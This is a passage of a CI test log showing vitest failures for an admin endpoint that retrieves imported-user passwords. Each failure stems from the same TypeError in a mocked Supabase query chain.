2025-11-18T17:35:25.8733682Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.8734542Z 
2025-11-18T17:35:25.8735157Z [31m     → expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:35:25.8737496Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAuthentication and Authorization[2m > [22mshould reject when profile lookup fails[39m
2025-11-18T17:35:25.8739265Z [31m     → expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:35:25.8741428Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould reject requests without sessionId[39m
2025-11-18T17:35:25.8743472Z [31m     → expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:35:25.8745616Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould reject requests with invalid sessionId type[39m
2025-11-18T17:35:25.8747655Z [31m     → expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:35:25.8749857Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould accept empty string sessionId (edge case)[39m
2025-11-18T17:35:25.8751520Z [31m     → expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:35:25.8753847Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould successfully retrieve passwords for valid session[39m
2025-11-18T17:35:25.8755678Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8758342Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould return empty array for non-existent session[39m
2025-11-18T17:35:25.8760068Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8762226Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould filter out metadata from password entries[39m
2025-11-18T17:35:25.8763987Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8766123Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould log password retrieval in audit_logs[39m
2025-11-18T17:35:25.8768177Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8770327Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould log even when no passwords found[39m
2025-11-18T17:35:25.8771935Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8773981Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould continue even if audit logging fails[39m
2025-11-18T17:35:25.8775693Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8778063Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mSecurity[2m > [22mshould clear passwords after retrieval (one-time access)[39m
2025-11-18T17:35:25.8779774Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8781874Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mSecurity[2m > [22mshould handle malicious session IDs safely[39m
2025-11-18T17:35:25.8783467Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:25.8786025Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject when profile lookup fails[22m[39m
2025-11-18T17:35:25.8788771Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8790598Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8792737Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:201:7
2025-11-18T17:35:25.8794551Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8796467Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8799009Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8801207Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8803151Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8805075Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8806636Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.8808421Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.8809436Z 
2025-11-18T17:35:25.8811475Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mRequest Validation[2m > [22m[2mshould reject requests without sessionId[22m[39m
2025-11-18T17:35:25.8813792Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8815615Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8817478Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:242:7
2025-11-18T17:35:25.8819108Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8820986Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8822929Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8824691Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8826645Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8927677Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8929468Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.8930982Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.8931697Z 
2025-11-18T17:35:25.8933728Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mRequest Validation[2m > [22m[2mshould reject requests with invalid sessionId type[22m[39m
2025-11-18T17:35:25.8935970Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8937898Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8939465Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:259:7
2025-11-18T17:35:25.8941514Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8943333Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8945029Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8946723Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8949598Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8951398Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8952955Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.8954466Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.8955194Z 
2025-11-18T17:35:25.8957549Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mRequest Validation[2m > [22m[2mshould accept empty string sessionId (edge case)[22m[39m
2025-11-18T17:35:25.8959777Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8961449Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8963005Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:278:7
2025-11-18T17:35:25.8964669Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8966454Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8968600Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8970417Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8972178Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8973998Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8975574Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.8977271Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.8977992Z 
2025-11-18T17:35:25.8980017Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mPassword Retrieval[2m > [22m[2mshould successfully retrieve passwords for valid session[22m[39m
2025-11-18T17:35:25.8982276Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8983957Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8985554Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:336:7
2025-11-18T17:35:25.8987890Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8989686Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8991495Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8993245Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8994971Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8996992Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8998611Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9000193Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9000926Z 
2025-11-18T17:35:25.9003129Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mPassword Retrieval[2m > [22m[2mshould return empty array for non-existent session[22m[39m
2025-11-18T17:35:25.9005426Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9007343Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9008998Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:367:7
2025-11-18T17:35:25.9010719Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9012457Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9014220Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9016003Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9017996Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9019789Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9021332Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9022804Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9023545Z 
2025-11-18T17:35:25.9025512Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mPassword Retrieval[2m > [22m[2mshould filter out metadata from password entries[22m[39m
2025-11-18T17:35:25.9027988Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9029717Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9031327Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:399:7
2025-11-18T17:35:25.9033235Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9035032Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9037034Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9038848Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9040678Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9042600Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9044161Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9045660Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9046381Z 
2025-11-18T17:35:25.9048762Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mAudit Logging[2m > [22m[2mshould log password retrieval in audit_logs[22m[39m
2025-11-18T17:35:25.9051021Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9052675Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9054139Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:456:7
2025-11-18T17:35:25.9055687Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9057467Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9059106Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9060753Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9062389Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9064292Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9065890Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9067925Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9068681Z 
2025-11-18T17:35:25.9070549Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mAudit Logging[2m > [22m[2mshould log even when no passwords found[22m[39m
2025-11-18T17:35:25.9072701Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9074403Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9075989Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:484:7
2025-11-18T17:35:25.9077857Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9079868Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9081663Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9083384Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9085130Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9087164Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9088725Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9090263Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9090985Z 
2025-11-18T17:35:25.9092858Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mAudit Logging[2m > [22m[2mshould continue even if audit logging fails[22m[39m
2025-11-18T17:35:25.9095219Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9097121Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9098734Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:514:7
2025-11-18T17:35:25.9100420Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9102186Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9103955Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9105759Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9107773Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9109603Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9111216Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9112814Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9113559Z 
2025-11-18T17:35:25.9115514Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mSecurity[2m > [22m[2mshould clear passwords after retrieval (one-time access)[22m[39m
2025-11-18T17:35:25.9118105Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9119828Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9121409Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:558:7
2025-11-18T17:35:25.9123016Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9125034Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9127055Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9128874Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9130662Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9132474Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9134097Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9135666Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9136417Z 
2025-11-18T17:35:25.9138535Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mSecurity[2m > [22m[2mshould handle malicious session IDs safely[22m[39m
2025-11-18T17:35:25.9140834Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9142650Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9144316Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:588:9
2025-11-18T17:35:25.9146005Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9148016Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9149689Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9151318Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9152981Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9154663Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9156120Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
